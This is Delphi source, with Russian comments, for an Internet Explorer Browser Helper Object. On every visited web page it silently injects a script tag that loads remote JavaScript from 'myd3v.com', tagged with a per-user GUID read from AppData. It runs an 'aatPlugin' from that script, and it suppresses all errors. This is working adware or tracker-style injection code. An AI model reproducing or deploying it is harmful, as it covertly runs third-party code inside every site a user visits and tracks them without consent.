unit MyBhoUnit;
interface
uses
  SysUtils,
  Classes,
  Windows,
  ActiveX,
  ComObj,
  BhoShell, MSHTML,
  ShDocVwEvents, Registry,
  Base64,
  httpsend,
  IdHashMessageDigest,
  dialogs;
  
 {$INCLUDE consts\consts.inc}

const

	CLSID_MyBhoObject: TCLSID = SCLSID_MyBhoObject;

type
  TMyBhoObject = class(TBrowserHelperObject)
  private
    procedure BeforeNavigate(Sender: TObject; const pDisp: IDispatch;
      var URL, Flags, TargetFrameName, PostData, Headers: OleVariant;
      var Cancel: WordBool);
    procedure NavigateComplete(Sender: TObject; const pDisp: IDispatch; var URL: OleVariant);
    procedure ProgressChange(ASender: TObject; Progress, ProgressMax: Integer);
    procedure DocumentComplete(Sender: TObject; const pDisp: IDispatch; var URL: OleVariant);
    procedure TitleChange(Sender: TObject; const Text: WideString);
  protected
    procedure DoEventsConnected; override;
    procedure DoEventsDisconnected; override;
  end;

Var
  PATH_TO_JS : String;
  guid, root_domain: String;
implementation
uses
  ComServ;

function ExecuteScript(doc: IHTMLDocument2; script: string; language: string): Boolean;
var
  win: IHTMLWindow2;
  Olelanguage: Olevariant;
begin
  if doc <> nil then
  begin
    try
      win := doc.parentWindow;
      if win <> nil then
      begin
        try
          Olelanguage := language;
         win.ExecScript(script, Olelanguage);
        finally
          win := nil;
        end;
      end;
    finally
      doc := nil;
    end;
  end;
end;

//Логирование в файл
procedure WriteLog(Line: string);
var
 F: TextFile;
 Text: String;
 FileName : String;
begin

 FileName := GetEnvironmentVariable('userprofile')+'\AppData\LocalLow\LogFile.txt';
 AssignFile(F, FileName);

 if fileexists(FileName) then
   append(f) 
 else 
 begin
   Rewrite(F);
   WriteLn(F,'File Log:');
 end;

  WriteLn(F,DateTimeToStr(Now) + ': ' + Line);
  CloseFile(F);
 end;

//===============================================================================================================

function GuidF(): string;
var f:textfile;
    guidvalue:String;
begin
      if FileExists(GetEnvironmentVariable('userprofile')+'\AppData\LocalLow\'+NameMainBuild+'\Guid\guid.txt') = true then
			begin
			  assignfile(f,GetEnvironmentVariable('userprofile')+'\AppData\LocalLow\'+NameMainBuild+'\Guid\guid.txt');
			  reset(f);
			  readln(f,guidvalue);
			  closefile(f);
			end;

      if guidvalue   = '' then guidvalue  := 'none';
      result := guidvalue;
end;

// Проверка есть ли скрипт с таким же src на странице
function IsSuchScript(Document: IHTMLDocument2; src:string):Boolean;
var flag:Boolean;
    DocA: IHTMLElementCollection; //коллекция элементов
    DocElement: IHtmlElement;
    i: Integer;
    attribute_src: string;
begin
			DocA := Document.all.tags('SCRIPT') as IHTMLElementCollection;
			flag := false;
			for i := 0 to DocA.length - 1 do
			Begin
				DocElement:=DocA.item(i,0) as IHTMLElement;
        attribute_src := DocElement.getAttribute('src',0);
				if attribute_src = src then
        begin
				flag := True;
        end;
			End;
      result := flag;
end;

procedure AppendScript(Document: IHTMLDocument2; script_name: string; Plugin_instance: string; guid: string; src:string);
var js: string;
begin

    js:= '(function(){'+#10+#13;
    js:= js + 'if ((top == self)){ '+#10+#13;
		js:= js + 'var head = document.getElementsByTagName("head")[0];'+#10+#13;
		js:= js + 'var script = document.createElement("script");'+#10+#13;
    js:= js + 'var done = false;'+#10+#13;
		js:= js + 'script.type = "text/javascript";'+#10+#13;
		js:= js + 'script.id = "'+Plugin_instance+'";'+#10+#13;
		js:= js + 'script.src = "' + src + '";'+#10+#13;
		js:= js + 'script.onload = script.onreadystatechange = function(){'+#10+#13;
    js:= js + 'if ( !done && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete") ) {'+#10+#13;
    js:= js + 'done = true;'+#10+#13;
    js:= js + 'try{'+#10+#13;
		js:= js + '(new aatPlugin("' + guid + '")).init();'+#10+#13;
    js:= js + '}'+#10+#13;
    js:= js + 'catch(err){}'+#10+#13;
    js:= js + '}'+#10+#13;
		js:= js + '};'+#10+#13;
		js:= js + 'if (head != null)' +  '{' + 'head.appendChild(script);'  + '}'+#10+#13;
    js:= js + '}'+#10+#13;
    js:= js + '})()'+#10+#13;

		ExecuteScript(Document, js,'JavaScript');

end;

//===============================================================================================================

procedure TMyBhoObject.BeforeNavigate(Sender: TObject; const pDisp: IDispatch; var URL, Flags, TargetFrameName, PostData,
  Headers: OleVariant; var Cancel: WordBool);
begin
end;

procedure TMyBhoObject.ProgressChange(ASender: TObject; Progress, ProgressMax: Integer);
begin
end;

procedure TMyBhoObject.DoEventsConnected;
begin
    inherited;
    Events.BeforeNavigate2 := BeforeNavigate;
    Events.NavigateComplete2 := NavigateComplete;
    Events.ProgressChange := ProgressChange;
    Events.DocumentComplete := DocumentComplete;
    Events.TitleChange := TitleChange;

    guid  := GuidF();
    root_domain  := 'myd3v.com';
    PATH_TO_JS := '//' + root_domain + '/js/aat.js?id=' + guid;

end;

procedure TMyBhoObject.TitleChange(Sender: TObject; const Text: WideString);
var URL: String;
    Document: IHTMLDocument2;
    b:boolean;
Begin

	URL := Trim(WebBrowser.LocationURL);
	// проверяем чтобы адрес сайта не был пустым, не был страницей about:blank и не был локальным файлом
	if (URL <> '') and (URL <> 'about:blank') and (URL<> 'about:Tabs') and (AnsiStrPos(PChar(URL),'file://') = nil) then
		Begin
	try
			
	Document := WebBrowser.Document as IHtmlDocument2;
	b := IsSuchScript(Document, PATH_TO_JS);
	// вставляем скрипт если его небыло
	if not b then
	Begin
		AppendScript(Document, 'script', Plugin_instance, guid, PATH_TO_JS);
	End
      
	except
	end;
	End
End;

procedure TMyBhoObject.DoEventsDisconnected;
begin
  inherited;
end;

procedure TMyBhoObject.NavigateComplete(Sender: TObject;  const pDisp: IDispatch; var URL: OleVariant);
begin

end;

procedure TMyBhoObject.DocumentComplete(Sender: TObject; const pDisp: IDispatch; var URL: OleVariant);
begin

end;

initialization
  TBrowserHelperFactory.Create(ComServer, TMyBhoObject, CLSID_MyBhoObject, '',Caption, ciMultiInstance, tmApartment);
end.
